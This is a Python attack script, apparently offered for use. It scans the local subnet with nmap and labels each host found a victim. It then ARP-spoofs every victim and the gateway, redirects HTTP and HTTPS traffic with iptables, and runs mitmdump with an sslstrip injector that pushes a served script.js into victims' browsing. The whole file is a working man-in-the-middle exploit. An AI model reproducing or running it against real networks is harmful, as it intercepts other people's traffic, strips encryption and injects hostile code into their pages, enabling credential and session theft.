import subprocess, re, os, sys


#### BEGIN CONFIG ####

whitelist = 'whitelist.txt' # IP addresses not to target
port = '8080' # port for IPTables
adapter = 'wlan0' # change to match your ifconfig setup (eth0, eth1, wlan0, etc.)

####  END CONFIG  ####


def get_victims(gateway):
    victims = []
    range = gateway.split('.')
    del range[3]
    range = '.'.join(range) + '.1-255'
    ip_str = str(subprocess.check_output(['nmap','-sn',range])) # use nmap -n to get connected devices
    ip_list = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", ip_str) # use regex to turn the output into a list of ip's

    if not os.path.isfile(whitelist):
        victims = ip_list
        print("No %s! Continuing...") % whitelist
    else:
        for ip in ip_list:
            if not ip == gateway and not ip == lhost and not ip in open(whitelist).read():
                # add ip to victims list if it's valid
                victims.append(ip)
            else:
                print("Skipping ip " + ip)

    return victims

# get gateway ip (router)
gateway = sys.argv[1]
print("gateway: " + gateway)
# get local ipv4 from 'ip addr'
lhost = os.popen('ip addr show ' + adapter).read().split("inet ")[1].split("/")[0]
print("local ip: " + lhost)
# get victim ip's
victims = get_victims(gateway)
print("victims: ")
for v in victims:
    print(v)


# configure routing (IPTABLES)
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
os.system("iptables -t nat -A POSTROUTING -o " + adapter + " -j MASQUERADE")
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port " + port)
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port " + port)


# run the arpspoof for each victim, each one in a new console
for victim in victims:
    os.system("xterm -e arpspoof -i " + adapter + " -t " + victim + " " + gateway + " &")
    os.system("xterm -e arpspoof -i " + adapter + " -t " + gateway + " " + victim + " &")

# start the http server for serving the script.js, in a new console
os.system("xterm -hold -e 'python3 httpServer.py' &")

# start the mitmproxy
os.system("~/.local/bin/mitmdump -s 'sslstrip_injector.py http://" + lhost + ":8000/script.js' -T")
